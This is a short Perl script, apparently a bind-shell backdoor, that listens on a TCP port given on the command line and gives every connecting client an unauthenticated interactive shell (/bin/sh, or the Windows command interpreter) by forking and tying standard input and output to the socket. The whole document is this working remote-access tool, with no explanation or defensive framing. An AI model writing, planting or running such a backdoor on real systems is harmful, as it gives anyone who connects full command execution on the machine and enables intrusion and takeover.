#!/usr/bin/perl
$os = $^O;
$SHELL="/bin/sh";
if($os =~ m/win/i){ $SHELL="%COMSPEC% /K";}
if (@ARGV < 1) { exit(1); }
$LISTEN_PORT=$ARGV[0];
use Socket;
$protocol=getprotobyname('tcp');
socket(S,&PF_INET,&SOCK_STREAM,$protocol) || die("error\n");
setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);
bind(S,sockaddr_in($LISTEN_PORT,INADDR_ANY)) || die("error\n");
listen(S,3) || die "";
while(1)
{
accept(CONN,S);
if(!($pid=fork))
{
die "Cannot fork" if (!defined $pid);
open STDIN,"<&CONN";
open STDOUT,">&CONN";
open STDERR,">&CONN";
exec $SHELL || die("error\n");
close CONN;
exit 0;
}
}